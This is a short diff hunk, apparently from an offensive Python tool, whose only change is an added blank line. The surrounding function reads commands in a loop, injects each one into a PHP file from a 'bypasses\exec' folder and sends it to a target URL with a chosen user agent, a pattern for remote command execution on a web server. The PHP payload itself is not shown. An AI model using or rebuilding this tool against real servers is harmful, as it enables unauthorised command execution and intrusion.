@@ -6,6 +6,7 @@ def exec(url,uagent):
         if cmd == "exit":
             break
         with open('bypasses\\exec\\exec.php') as f:data = f.read()
+        
         data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
         print(send.send(url,data,uagent))
 
